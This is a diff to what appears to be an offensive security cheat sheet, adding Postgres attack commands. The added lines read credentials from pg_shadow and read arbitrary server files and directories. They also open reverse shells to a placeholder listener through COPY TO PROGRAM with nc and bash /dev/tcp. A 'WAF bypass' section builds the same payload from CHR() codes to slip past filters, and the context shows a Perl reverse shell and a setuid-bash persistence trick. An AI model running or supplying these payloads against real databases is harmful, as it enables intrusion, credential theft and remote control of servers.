@@ -540,7 +540,9 @@ postgres=# \q                        // quit
 <DATABASE>=# TABLE <TABLE>;          // select table
 <DATABASE>=# SELECT * FROM users;    // select everything from users table
 <DATABASE>=# SHOW rds.extensions;    // list installed extensions
-<DATABASE>=# SELECT usename, passwd from pg_shadow;    // read credentials
+<DATABASE>=# SELECT usename, passwd from pg_shadow;                         // read credentials
+<DATABASE>=# SELECT * FROM pg_ls_dir('/'); --                               // read directories
+<DATABASE>=# SELECT pg_read_file('/PATH/TO/FILE/<FILE>', 0, 1000000); --    // read a file
 ```
 
 ### Postgres Remote Code Execution
@@ -566,6 +568,12 @@ or
 Notice that in order to scape a single quote you need to put `2 single` quotes.
 
 ```c
+<DATABASE>=# COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f';
+```
+
+or
+
+```c
 <DATABASE>=# COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<LPORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
 ```
 
@@ -573,6 +581,25 @@ Notice that in order to scape a single quote you need to put `2 single` quotes.
 
 ```c
 <DATABASE>=# COPY (SELECT CAST('cp /bin/bash /var/lib/postgresql/bash;chmod 4777 /var/lib/postgresql/bash;' AS text)) TO '/var/lib/postgresql/.profile';"
+```
+
+#### Web Application Firewall (WAF) Bypass
+
+##### Reverse Shell
+
+```c
+<DATABASE>=# EXECUTE CHR(67)||CHR(82)||CHR(69)||CHR(65)||CHR(84)||CHR(69)||' TABLE shell(output text);'
+```
+
+```c
+DO $$
+DECLARE
+    c text;
+BEGIN
+    c := CHR(67)||CHR(79)||CHR(80)||CHR(89)||
+        ' (SELECT '''') to program ''bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"''';
+    EXECUTE c;
+END $$;
 ```
 
 ## Redis
